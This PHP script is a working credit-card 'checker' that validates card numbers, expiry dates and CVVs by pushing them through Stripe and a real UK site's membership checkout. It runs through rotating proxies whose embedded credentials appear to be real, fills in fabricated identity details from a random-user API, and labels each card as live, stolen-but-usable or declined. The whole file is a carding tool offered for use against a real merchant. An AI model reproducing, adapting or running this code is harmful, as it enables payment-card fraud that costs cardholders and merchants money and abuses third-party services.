<?php

///////////////BASE BY CYRAX////////////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function cyraxproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cyraxproxies();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//=======================[Proxys]=============================//
$rp1 = array(
  1 => 'memmlyck-rotate:w60rhz148at4',
  2 => 'aqitlvpz-rotate:jrxjhdvyn5ow',
  3 => 'sdmybznj-rotate:azme0w2fvbyo',
  4 => 'tvubajvb-rotate:bdec1i5gu50d',
  5 => 'pwtqofpz-rotate:cs4m2oo18shj',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

echo '[ IP: '.$ip.' ] ';
//=======================[Proxys END]=============================//
////////////////////////////===[1st Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer:https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=PH&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d3e46c68-a831-42d7-916a-0871aab27a66df9143&muid=3e317f2d-8694-414b-96e1-2518e1acaf2aa871cd&sid=747f7333-2fd5-41e6-93b9-2ddb5f47352b10f1d6&payment_user_agent=stripe.js%2F89c3b0729%3B+stripe-js-v3%2F89c3b0729&time_on_page=54515&referrer=https%3A%2F%2Fwww.ipsofactoinvestor.co.uk%2F&key=pk_live_mXfetQYEJuFTccUWfPl2jPuW');

$result1 = curl_exec($ch);
$id = 
trim(strip_tags(getStr($result1,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

 $ch = curl_init();

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
 curl_setopt($ch, CURLOPT_URL, 'https://www.ipsofactoinvestor.co.uk/membership/checkout?level=2');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
   'content-type: application/x-www-form-urlencoded',
   'cookie: __stripe_mid=3e317f2d-8694-414b-96e1-2518e1acaf2aa871cd;PHPSESSID=usk3m7jtiqug5dj8vqhq81l1bp;pmpro_visit=1;__stripe_sid=747f7333-2fd5-41e6-93b9-2ddb5f47352b10f1d6',   
   'Origin: https://www.ipsofactoinvestor.co.uk',
   'referer: https://www.ipsofactoinvestor.co.uk/membership/checkout?level=2',
   'Sec-Fetch-Mode: navigate',
   'X-Requested-With: XMLHttpRequest',
 ));
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=2&checkjavascript=1&username=Ruben17&password=cbr042701&password2=cbr042701&bemail='.$email.'&bconfirmemail='.$email.'&first_name='.$name.'&last_name='.$last.'&telephone=09512637341&address_1=Pasay%2C+san+roque&address_2=&city=Zamboanga+City&county=Philippines&postcode=7000&country=Philippines&fullname=&bfirstname=Jessica&blastname=Morel&baddress1=Pasay%2C+san+roque&baddress2=&bcity=Zamboanga+City&bstate=Zamboanga+Del+sur&bzipcode='.$postcode.'&bcountry=PH&bphone=0+%28951%29+263-7341&CardType=visa&tos=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=&ExpirationMonth=&ExpirationYear=');

 $result = curl_exec($ch);
 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED FLEX ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED FLEX ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHEDFLEX </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE FLEX</span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE FLEX/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE FLEX </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN LIVE FLEX♛ </span></br>';
}
elseif(strpos($result, 'The zip code you supplied failed validation.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED - Netflix na par! FLEX♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Stolen_Card - Sometime Useable FLEX ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Lost_Card - Sometime Useable FLEX♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Insufficient Funds FLEX♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Expired FLEX♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Pickup Card_Card - Sometime Useable FLEX ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number FLEX ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number FLEX♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ UMAY! FLEX ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Generic_Decline FLEX♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Do_Not_Honor FLEX ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Unchecked [Proxy Dead] FLEX ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Fail FLEX♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Expired Card FLEX ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Doesnt Support This Purchase FLEX ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Double check lods FLEX ♛</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result
//echo $token; //to check if token captured or not 

///////////////////////////////////////////////====== By CyraX===============\\\\\\\\\\\\\\\[Used Reboot13 Raw Base ]
?>
